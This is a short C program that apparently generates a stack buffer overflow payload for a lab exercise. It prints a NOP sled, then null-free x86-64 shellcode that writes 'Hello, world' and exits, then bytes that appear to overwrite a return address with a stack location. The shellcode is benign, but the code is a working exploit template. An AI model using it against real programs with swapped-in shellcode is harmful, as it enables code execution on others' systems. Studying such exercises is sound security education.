#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#define MAX 1024
int main()
{
  char *filler;
  int flow_len;
  int nop_len;
  setvbuf(stdout, NULL, _IOLBF,0);

  char flow[] = "\xeb\x3e\x5e\x48\xc7\xc0\x69\x69\x69\x69\x48\x2d\x68\x69\x69"
    "\x69\x48\xc7\xc7\x69\x69\x69\x69\x48\x81\xef\x68\x69\x69\x69"
    "\x48\xc7\xc2\x69\x69\x69\x69\x48\x81\xea\x5c\x69\x69\x69\x0f"
    "\x05\x48\xc7\xc0\x69\x69\x69\x69\x48\x2d\x2d\x69\x69\x69\x48"
    "\x31\xff\x0f\x05\xe8\xbd\xff\xff\xff\x48\x65\x6c\x6c\x6f\x2c"
    "\x20\x77\x6f\x72\x6c\x64\x0a\x6a\xd5\xff\xff\xff\x7f";
  flow_len = strlen(flow);
  nop_len = 262 - flow_len;
  
  /*allocating some memory space for NOPs and shell code*/
  filler = (char *)malloc(MAX*sizeof(char));
  
  /*filling filler with nop_len amount of  NOPs(0x90)*/
  memset(filler,0x90,nop_len);

  /*making NOPs string*/
  filler[nop_len] = '\0';

  /*printing flow right after printer, combining them into one in a file*/
  printf("%s",filler);
  printf("%s", flow);
  
  return 0;
}
